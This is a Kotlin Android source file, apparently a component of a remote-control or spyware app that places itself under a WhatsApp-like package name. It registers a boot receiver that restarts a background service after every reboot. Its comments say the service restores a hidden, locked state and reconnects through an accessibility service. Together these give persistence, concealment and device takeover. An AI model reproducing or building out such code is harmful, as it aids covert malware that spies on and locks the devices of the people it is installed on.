package com.whatsapp.bug.crash

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import androidx.core.content.ContextCompat

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        val action = intent?.action ?: return
        if (action == Intent.ACTION_BOOT_COMPLETED ||
            action == "android.intent.action.QUICKBOOT_POWERON" ||
            action == "android.intent.action.LOCKED_BOOT_COMPLETED") {

            // Start DeviceService — dia akan restore hide+lock state dari prefs
            val serviceIntent = Intent(context, DeviceService::class.java)
            ContextCompat.startForegroundService(context, serviceIntent)

            // Kalau accessibility masih aktif (persisted), langsung trigger connect
            // via broadcast — accessibility service akan send ACTION_ACCESSIBILITY_READY
            // sendiri saat onServiceConnected, jadi ini cukup start service saja
        }
    }
}
